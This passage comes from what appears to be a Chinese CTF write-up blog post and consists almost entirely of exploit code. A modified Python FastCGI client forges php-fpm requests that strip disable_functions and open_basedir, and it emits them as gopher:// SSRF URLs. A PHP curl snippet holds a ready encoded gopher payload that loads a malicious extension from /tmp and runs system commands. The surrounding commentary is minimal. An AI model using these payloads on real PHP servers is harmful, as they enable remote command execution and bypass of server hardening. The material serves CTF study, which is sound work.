class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request</span></span><br><span class="line">        <span class="comment">#self.sock.send(request)</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;response&#x27;] = &#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#return self.__waitForResponse(requestId)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;39001&#x27;</span></span><br><span class="line">    client = FastCGIClient(host, port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = <span class="string">&#x27;/var/www/html/index.php&#x27;</span></span><br><span class="line">    content = <span class="string">&#x27;&lt;?=`id`;?&gt;&#x27;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;39001&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % len(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;open_basedir = /\ndisable_functions = \ndisable_classes = \nauto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了</span></span><br><span class="line">    <span class="comment">#response = client.request(params, content)</span></span><br><span class="line">    <span class="comment">#print(force_text(response))</span></span><br><span class="line">    request_data = client.request(params, content)</span><br><span class="line">    print(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + str(port) + <span class="string">&quot;/_&quot;</span> + urlparse.quote(request_data))</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    print(urlparse.quote(base64.b64encode(request_data)))</span><br></pre></td></tr></table></figure>
+
+<p>执行完爆这个错 不清楚为啥 </p>
+<p><img src="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/image-20210606115031340.png" alt="image-20210606115031340"></p>
+<p>试试加载扩展吧</p>
+<p>使用php7.0编译：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/ant_php_extension">https://github.com/AntSwordProject/ant_php_extension</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_content</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); </span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">0</span>); </span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">5</span>);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> get_content(<span class="string">&#x27;gopher://127.0.0.1:39001/_%01%01%EF%FF%00%08%00%00%00%01%00%00%00%00%00%00%01%04%EF%FF%02U%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%05SERVER_PORT39001%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH21%09oPHP_VALUEdisable_classes%20%3D%20%0Adisable_functions%20%3D%20%0Aallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aauto_prepend_file%20%3D%20php%3A//input%0F%3DPHP_ADMIN_VALUEextension_dir%20%3D%20/tmp%0Aextension%20%3D%20mb.so%0Aallow_url_include%20%3D%20On%01%04%EF%FF%00%00%00%00%01%05%EF%FF%00%15%00%00%3C%3F%3Dantsystem%28%22id%22%29%3B%3F%3E%01%05%EF%FF%00%00%00%00&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最终</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> six.moves.urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line">        <span class="comment"># self.sock.settimeout(self.timeout)</span></span><br><span class="line">        <span class="comment"># self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span></span><br><span class="line">        <span class="comment"># # if self.keepalive:</span></span><br><span class="line">        <span class="comment"># #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># # else:</span></span><br><span class="line">        <span class="comment"># #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="comment"># try:</span></span><br><span class="line">        <span class="comment">#     self.sock.connect((self.host, int(self.port)))</span></span><br><span class="line">        <span class="comment"># except socket.error as msg:</span></span><br><span class="line">        <span class="comment">#     self.sock.close()</span></span><br><span class="line">        <span class="comment">#     self.sock = None</span></span><br><span class="line">        <span class="comment">#     print(repr(msg))</span></span><br><span class="line">            <span class="comment"># return False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span 